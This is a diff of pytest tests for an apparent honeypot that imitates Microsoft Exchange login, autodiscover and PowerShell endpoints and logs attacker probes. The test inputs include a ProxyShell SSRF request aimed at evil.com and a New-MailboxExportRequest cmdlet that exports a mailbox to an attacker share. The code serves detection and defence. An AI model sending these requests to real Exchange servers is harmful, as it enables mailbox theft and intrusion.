@@ -557,6 +557,7 @@ def test_all_trap_families_default_on():
     assert tbenv.SAP_METADATAUPLOADER_ENABLED
     assert tbenv.CITRIX_GATEWAY_ENABLED
     assert tbenv.RDWEB_ENABLED
+    assert tbenv.EXCHANGE_ENABLED
     assert tbenv.GLOBALPROTECT_ENABLED
     assert tbenv.SOPHOS_VPN_ENABLED
     assert tbenv.BARRACUDA_VPN_ENABLED
@@ -3810,6 +3811,291 @@ async def test_dispatch_rdweb_disabled_returns_404(flux_client, monkeypatch):
     resp = await flux_client.get(
         "/RDWeb/Pages/en-US/login.aspx",
         headers={"X-Forwarded-For": "203.0.113.191"},
+    )
+    assert resp.status == 404
+    entries = _log_entries(flux_client.log_path)
+    assert entries[-1]["result"] == "not-handled"
+
+
+# --- Exchange (OWA / ECP / autodiscover / PSRemoting / ProxyShell) ------
+
+def test_exchange_enabled_by_default():
+    assert tbenv.EXCHANGE_ENABLED
+
+
+@pytest.mark.parametrize(
+    "path",
+    [
+        "/owa/auth/logon.aspx",
+        "/OWA/auth/logon.aspx",
+        "/owa/",
+        "/owa",
+        "/owa/auth/x.js",
+        "/owa/auth/errorFE.aspx",
+        "/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application",
+        "/ecp/",
+        "/autodiscover/autodiscover.json",
+        "/autodiscover/autodiscover.xml",
+        "/powershell/",
+        "/mapi/emsmdb",
+        "/oab/",
+        "/ews/exchange.asmx",
+    ],
+)
+def test_exchange_path_match(path):
+    assert tbenv.is_exchange_path(path), f"expected exchange match: {path}"
+
+
+@pytest.mark.parametrize(
+    "path",
+    [
+        "/",
+        "/owafoo",                    # prefix must include trailing slash
+        "/exchange-foo",
+        "/aspnet_client/system_web/", # webshell-drop dir, handled elsewhere
+        "/.env",
+    ],
+)
+def test_exchange_path_non_match(path):
+    assert not tbenv.is_exchange_path(path), f"unexpected exchange match: {path}"
+
+
+def test_exchange_disabled_returns_false(monkeypatch):
+    monkeypatch.setattr(tbenv, "EXCHANGE_ENABLED", False)
+    assert not tbenv.is_exchange_path("/owa/auth/logon.aspx")
+    assert not tbenv.is_exchange_path("/autodiscover/autodiscover.json")
+
+
+def test_render_exchange_owa_login_html_shape():
+    body = tbenv.render_exchange_owa_login_html(
+        "owa.example", "15.02.1118.026",
+    ).decode("utf-8")
+    assert "Outlook" in body
+    # Real OWA posts back to /owa/auth.owa
+    assert "/owa/auth.owa" in body
+    assert 'name="username"' in body
+    assert 'name="password"' in body
+    # The build string is stamped in the footer for fingerprinting
+    assert "15.02.1118.026" in body
+
+
+def test_render_exchange_owa_login_html_canary_per_request_unique():
+    a = tbenv.render_exchange_owa_login_html("h", "15.02.1118.026").decode("utf-8")
+    b = tbenv.render_exchange_owa_login_html("h", "15.02.1118.026").decode("utf-8")
+    assert a != b, "OWA canary must be per-request unique — never a fixed literal"
+
+
+def test_render_exchange_autodiscover_json_embeds_per_request_bearer():
+    a = tbenv.render_exchange_autodiscover_json(
+        "ex.example", "victim@example.com", "tok_a_a_a",
+    ).decode("utf-8")
+    b = tbenv.render_exchange_autodiscover_json(
+        "ex.example", "victim@example.com", "tok_b_b_b",
+    ).decode("utf-8")
+    assert "tok_a_a_a" in a
+    assert "tok_b_b_b" in b
+    assert a != b
+    # Each response carries a fresh MailboxGuid too
+    import json as _json
+    da = _json.loads(a)
+    db = _json.loads(b)
+    assert da["MailboxGuid"] != db["MailboxGuid"]
+
+
+def test_render_exchange_exporttool_application_xml_shape():
+    body = tbenv.render_exchange_exporttool_application(
+        "ex.example", "15.02.1118.026",
+    ).decode("utf-8")
+    assert body.startswith("<?xml")
+    assert "microsoft.exchange.ediscovery.exporttool.application" in body
+    assert 'version="15.02.1118.026"' in body
+    assert "ex.example" in body
+
+
+def test_extract_exchange_form_owa_username():
+    body = b"username=DOMAIN%5Cadmin&password=hunter2&flags=4"
+    username, has_password = tbenv.extract_exchange_form(
+        body, "application/x-www-form-urlencoded",
+    )
+    assert username == "DOMAIN\\admin"
+    assert has_password is True
+
+
+def test_extract_exchange_form_alt_field_names():
+    body = b"j_username=admin&j_password=p"
+    username, has_password = tbenv.extract_exchange_form(
+        body, "application/x-www-form-urlencoded",
+    )
+    assert username == "admin"
+    assert has_password is True
+
+
+def test_exchange_has_ps_cmdlet_matches_proxyshell_payloads():
+    assert tbenv._exchange_has_ps_cmdlet(
+        "$session = new-mailboxexportrequest -mailbox admin"
+    )
+    assert tbenv._exchange_has_ps_cmdlet(
+        "Import-Module ActiveDirectory; Get-Mailbox"
+    )
+    assert not tbenv._exchange_has_ps_cmdlet("hello world")
+
+
+async def test_dispatch_exchange_owa_login(flux_client):
+    resp = await flux_client.get(
+        "/owa/auth/logon.aspx",
+        headers={"X-Forwarded-For": "203.0.113.200", "Host": "owa.example"},
+    )
+    assert resp.status == 200
+    text = await resp.text()
+    assert "Outlook" in text
+    assert resp.headers.get("Server") == "Microsoft-IIS/10.0"
+    assert resp.headers.get("X-OWA-Version") == "15.02.1118.026"
+    set_cookie = resp.headers.get("Set-Cookie", "")
+    assert "cadata=" in set_cookie
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "exchange-owa-login"
+    assert entry["exchangePath"] == "/owa/auth/logon.aspx"
+
+
+async def test_dispatch_exchange_owa_credential_post_logs_username(flux_client):
+    resp = await flux_client.post(
+        "/owa/auth/logon.aspx",
+        data="username=DOMAIN%5Cadmin&password=hunter2&flags=4",
+        headers={
+            "X-Forwarded-For": "203.0.113.201",
+            "Content-Type": "application/x-www-form-urlencoded",
+        },
+    )
+    assert resp.status == 200
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "exchange-owa-credential-post"
+    assert entry["exchangeUsername"] == "DOMAIN\\admin"
+    assert entry["exchangeHasPassword"] is True
+    # password value is never lifted into a dedicated logged field
+    # (bodyPreview still mirrors the raw POST for triage, same as
+    # every other credential trap).
+    assert "exchangePassword" not in entry
+    assert "password" not in entry
+
+
+async def test_dispatch_exchange_owa_session_cookie_per_request_unique(flux_client):
+    cookies = []
+    for i in range(2):
+        resp = await flux_client.get(
+            "/owa/auth/logon.aspx",
+            headers={"X-Forwarded-For": f"203.0.113.{210 + i}"},
+        )
+        assert resp.status == 200
+        cookies.append(resp.headers.get("Set-Cookie", ""))
+    assert cookies[0] != cookies[1]
+    assert "cadata=" in cookies[0] and "cadata=" in cookies[1]
+
+
+async def test_dispatch_exchange_autodiscover_proxyshell_ssrf(flux_client):
+    # The literal CVE-2021-34473 SSRF probe shape: `?@<spoof>&Email=…`
+    resp = await flux_client.get(
+        "/autodiscover/autodiscover.json?@evil.com/Powershell&Email=admin@autodiscover.example",
+        headers={"X-Forwarded-For": "203.0.113.220", "Host": "ex.example"},
+    )
+    assert resp.status == 200
+    text = await resp.text()
+    assert "Bearer " in text
+    assert "MailboxGuid" in text
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "exchange-autodiscover-proxyshell-ssrf"
+    assert entry["exchangeAutodiscoverSpoofTarget"] == "evil.com/Powershell"
+    assert entry["exchangeAutodiscoverEmail"] == "admin@autodiscover.example"
+
+
+async def test_dispatch_exchange_autodiscover_bearer_per_request_unique(flux_client):
+    bodies = []
+    for i in range(2):
+        resp = await flux_client.get(
+            f"/autodiscover/autodiscover.json?@target{i}.com&Email=u{i}@x.com",
+            headers={"X-Forwarded-For": f"203.0.113.{230 + i}"},
+        )
+        assert resp.status == 200
+        bodies.append(await resp.text())
+    assert bodies[0] != bodies[1]
+    # both contain a Bearer literal but the literal itself is per-hit unique
+    assert "Bearer " in bodies[0] and "Bearer " in bodies[1]
+
+
+async def test_dispatch_exchange_exporttool_clickonce_manifest(flux_client):
+    resp = await flux_client.get(
+        "/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application",
+        headers={"X-Forwarded-For": "203.0.113.240", "Host": "ex.example"},
+    )
+    assert resp.status == 200
+    text = await resp.text()
+    assert text.startswith("<?xml")
+    assert "15.02.1118.026" in text
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "exchange-exporttool-manifest"
+
+
+async def test_dispatch_exchange_owa_landing_and_error_and_bootstrap(flux_client):
+    # /owa/ -> 200 landing
+    resp = await flux_client.get(
+        "/owa/", headers={"X-Forwarded-For": "203.0.113.250"},
+    )
+    assert resp.status == 200
+    assert _log_entries(flux_client.log_path)[-1]["result"] == "exchange-owa-landing"
+
+    # /owa/auth/x.js -> 200 with build version in the body
+    resp = await flux_client.get(
+        "/owa/auth/x.js", headers={"X-Forwarded-For": "203.0.113.251"},
+    )
+    assert resp.status == 200
+    assert "owa-build=15.02.1118.026" in await resp.text()
+    assert _log_entries(flux_client.log_path)[-1]["result"] == "exchange-owa-bootstrap-js"
+
+    # /owa/auth/errorFE.aspx?httpCode=500 -> 200 error page; code in log
+    resp = await flux_client.get(
+        "/owa/auth/errorFE.aspx?httpCode=500",
+        headers={"X-Forwarded-For": "203.0.113.252"},
+    )
+    assert resp.status == 200
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "exchange-owa-error"
+    assert entry["exchangeOwaErrorHttpCode"] == "500"
+
+
+async def test_dispatch_exchange_powershell_401(flux_client):
+    resp = await flux_client.get(
+        "/powershell/", headers={"X-Forwarded-For": "203.0.113.253"},
+    )
+    assert resp.status == 401
+    assert "Negotiate" in resp.headers.get("WWW-Authenticate", "")
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "exchange-powershell-pre-auth"
+
+
+async def test_dispatch_exchange_powershell_cmdlet_attempt_flagged(flux_client):
+    resp = await flux_client.post(
+        "/powershell/",
+        data="$session = New-MailboxExportRequest -Mailbox admin -FilePath \\\\evil\\share\\out.pst",
+        headers={
+            "X-Forwarded-For": "203.0.113.254",
+            "Content-Type": "application/soap+xml",
+            "X-Rps-CAT": "AAEAAAD" + "A" * 200,  # plausible Kerberos ticket length
+        },
+    )
+    assert resp.status == 401
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "exchange-powershell-cmdlet-attempt"
+    assert entry["exchangeXRpsCatPresent"] is True
+    assert entry["exchangeHasPowershellCmdlet"] is True
+
+
+async def test_dispatch_exchange_disabled_returns_404(flux_client, monkeypatch):
+    monkeypatch.setattr(tbenv, "EXCHANGE_ENABLED", False)
+    resp = await flux_client.get(
+        "/owa/auth/logon.aspx",
+        headers={"X-Forwarded-For": "203.0.113.255"},
     )
     assert resp.status == 404
     entries = _log_entries(flux_client.log_path)
